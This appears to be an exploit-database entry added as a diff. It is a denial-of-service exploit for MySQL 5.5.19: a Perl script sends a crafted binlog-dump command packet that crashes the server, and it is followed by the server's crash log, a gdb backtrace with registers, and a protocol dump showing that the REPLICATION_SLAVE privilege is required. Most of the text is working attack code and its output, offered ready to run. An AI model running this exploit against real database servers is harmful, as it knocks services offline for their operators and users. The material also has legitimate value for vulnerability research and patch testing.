@@ -1,0 +1,157 @@
+5.5.19-log on SuSE Linux
+
+DoS exploit:
+--------------------------------------------------------------------------------------------------------
+use Net::MySQL;
+use Unicode::UTF8 qw[decode_utf8 encode_utf8];
+
+$|=1;
+	    	  
+  my $mysql = Net::MySQL->new(
+      hostname => '192.168.2.3',   # Default use UNIX socket
+      database => 'test',
+      user     => "monty",
+      password => "python",
+      debug => 1,
+  );
+  
+  $mysql->_execute_command("\x12", "\x00\x00\x00\x00 foo");
+  exit;
+  
+  for ($k=0;$k<50000;$k++) {
+  	  $a .="<A$k>";
+  }
+  for ($k=0;$k<50000;$k++) {
+  	  $a .="</A$k>";
+  }  
+  
+# SELECT example
+  $mysql->query("SELECT UpdateXML('<a>$a<b>ccc</b><d></d></a>', '/a', '<e>fff</e>') AS val1");
+  
+  my $record_set = $mysql->create_record_iterator;
+  while (my $record = $record_set->each) {
+      printf "First column: %s Next column: %s\n",
+          $record->[0], $record->[1];
+  }
+  $mysql->close;
+  
+
+Crash Log:
+--------------------------------------------------------------------------------------------------------
+started:
+/usr/local/mysql/bin/mysqld --log=/tmp/mysql55.log --user=mysql --log-bin=/tmp/logbin2 &
+  
+120108 12:55:28 - mysqld got signal 11 ;
+This could be because you hit a bug. It is also possible that this binary
+or one of the libraries it was linked against is corrupt, improperly built,
+or misconfigured. This error can also be caused by malfunctioning hardware.
+We will try our best to scrape up some info that will hopefully help diagnose
+the problem, but since we have already crashed, something is definitely wrong
+and this may fail.
+
+key_buffer_size=16777216
+read_buffer_size=262144
+max_used_connections=1
+max_threads=151
+thread_count=1
+connection_count=1
+It is possible that mysqld could use up to
+key_buffer_size + (read_buffer_size + sort_buffer_size)*max_threads = 133453 K
+bytes of memory
+Hope that's ok; if not, decrease some variables in the equation.
+
+Thread pointer: 0x8e6fa48
+Attempting backtrace. You can use the following information to find out
+where mysqld died. If you see no messages after this, something went
+terribly wrong...
+stack_bottom = 0xa868b35c thread_stack 0x30000
+/usr/local/mysql/bin/mysqld(my_print_stacktrace+0x33)[0x83b0f63]
+/usr/local/mysql/bin/mysqld(handle_segfault+0x4bc)[0x813c59c]
+[0xffffe400]
+/usr/local/mysql/bin/mysqld(_Z16dispatch_command19enum_server_commandP3THDPcj+0x11b4)[0x81b09e4]
+/usr/local/mysql/bin/mysqld(_Z10do_commandP3THD+0xbc)[0x81b13ac]
+/usr/local/mysql/bin/mysqld(_Z24do_handle_one_connectionP3THD+0x183)[0x823eb63]
+/usr/local/mysql/bin/mysqld(handle_one_connection+0x3c)[0x823ebbc]
+/lib/libpthread.so.0(+0x5b05)[0xb771cb05]
+/lib/libc.so.6(clone+0x5e)[0xb74e7d5e]
+
+Trying to get some variables.
+Some pointers may be invalid and cause the dump to abort.
+Query ((nil)): is an invalid pointer
+Connection ID (thread ID): 12
+Status: NOT_KILLED
+
+The manual page at http://dev.mysql.com/doc/mysql/en/crashing.html contains
+information that should help you find out what is causing the crash.
+
+Version: '5.5.19-log'  socket: '/var/run/mysql/mysql.sock'  port: 3306  Source distribution
+[New Thread 0xa8f1db70 (LWP 7907)]
+120108 13:01:51 [Warning] IP address '192.168.2.150' could not be resolved: Name or service not known
+120108 13:01:51 [Note] Start binlog_dump to slave_server(65), pos(, 4294967295)
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0xa8f1db70 (LWP 7907)]
+mysql_binlog_send (thd=0x8e6fb28, log_ident=0x8eb57a8 "", pos=<value optimized out>, flags=65535) at /root/mysql-5.5.19/sql/sql_repl.cc:1043
+1043                    log_file_name, (llstr(my_b_tell(&log), llbuff2), llbuff2));
+(gdb) x/10i $eip
+=> 0x81bf54a <mysql_binlog_send(THD*, char*, my_off_t, ushort)+1370>:   mov    0x8(%ecx),%edx
+   0x81bf54d <mysql_binlog_send(THD*, char*, my_off_t, ushort)+1373>:   mov    0x4(%ecx),%eax
+   0x81bf550 <mysql_binlog_send(THD*, char*, my_off_t, ushort)+1376>:   mov    %edx,0x4(%esp)
+   0x81bf554 <mysql_binlog_send(THD*, char*, my_off_t, ushort)+1380>:   mov    %eax,(%esp)
+   0x81bf557 <mysql_binlog_send(THD*, char*, my_off_t, ushort)+1383>:   call   0x8541560 <llstr>
+   0x81bf55c <mysql_binlog_send(THD*, char*, my_off_t, ushort)+1388>:   mov    -0x9b0(%ebp),%edx
+   0x81bf562 <mysql_binlog_send(THD*, char*, my_off_t, ushort)+1394>:   lea    -0x590(%ebp),%eax
+   0x81bf568 <mysql_binlog_send(THD*, char*, my_off_t, ushort)+1400>:   mov    %edi,0x1c(%esp)
+   0x81bf56c <mysql_binlog_send(THD*, char*, my_off_t, ushort)+1404>:   lea    -0x990(%ebp),%edi
+   0x81bf572 <mysql_binlog_send(THD*, char*, my_off_t, ushort)+1410>:   mov    %eax,0x18(%esp)
+(gdb) i r
+eax            0xa8f1c804       -1460549628
+ecx            0x0      0
+edx            0xa8f1c805       -1460549627
+ebx            0x8e821e0        149430752
+esp            0xa8f1be50       0xa8f1be50
+ebp            0xa8f1c868       0xa8f1c868
+esi            0xa8f1c81a       -1460549606
+edi            0xa8f1c804       -1460549628
+eip            0x81bf54a        0x81bf54a <mysql_binlog_send(THD*, char*, my_off_t, ushort)+1370>
+eflags         0x210282 [ SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+unprivileged user (REPLICATION_SLAVE privs needed to trigger the bug):
+--------------------------------------------------------------------------------------------------------
+C:\Users\kingcope\Desktop>perl mysql.pl
+Use INET Socket: 192.168.2.3 3306/tcp
+Net::MySQL::_get_server_information():
+4E 00 00 00 0A 35 2E 35 2E 31 39 2D 6C 6F 67 00  N....5.5.19-log.
+01 00 00 00 59 4C 50 2C 29 28 2E 4F 00 FF F7 08  ....YLP,)(.O....
+02 00 0F 80 15 00 00 00 00 00 00 00 00 00 00 22  ................
+59 7C 24 3A 36 40 21 22 26 38 29 00 6D 79 73 71  Y...6....8).mysq
+6C 5F 6E 61 74 69 76 65 5F 70 61 73 73 77 6F 72  l_native_passwor
+64 00                                            d.
+Protocol Version: 10
+Server Version: 5.5.19-log
+Salt: YLP,)(.O"Y|$:6@!"&8)
+Net::MySQL::_send_login_message():
+41 00 00 01 0D A6 03 00 00 00 00 01 21 00 00 00  A...............
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+00 00 00 00 6D 6F 6E 74 79 32 00 14 21 2F FB 64  ....monty2.....d
+27 B4 FE 26 89 F7 D6 E7 2A A1 C9 00 A9 CF 4E 51  '.......*.....NQ
+74 65 73 74 00                                   test.
+Net::MySQL::_request_authentication():
+07 00 00 02 00 00 00 02 00 00 00                 ...........
+connect database
+Net::MySQL::_execute_command():
+0A 00 00 00 12 00 00 00 00 00 00 FF 00 00        ..............
+Net::MySQL::_execute_command():
+68 00 00 01 FF CB 04 23 34 32 30 30 30 41 63 63  h.......42000Acc
+65 73 73 20 64 65 6E 69 65 64 3B 20 79 6F 75 20  ess.denied;.you.
+6E 65 65 64 20 28 61 74 20 6C 65 61 73 74 20 6F  need.(at.least.o
+6E 65 20 6F 66 29 20 74 68 65 20 52 45 50 4C 49  ne.of).the.REPLI
+43 41 54 49 4F 4E 20 53 4C 41 56 45 20 70 72 69  CATION.SLAVE.pri
+76 69 6C 65 67 65 28 73 29 20 66 6F 72 20 74 68  vilege(s).for.th
+69 73 20 6F 70 65 72 61 74 69 6F 6E              is.operation
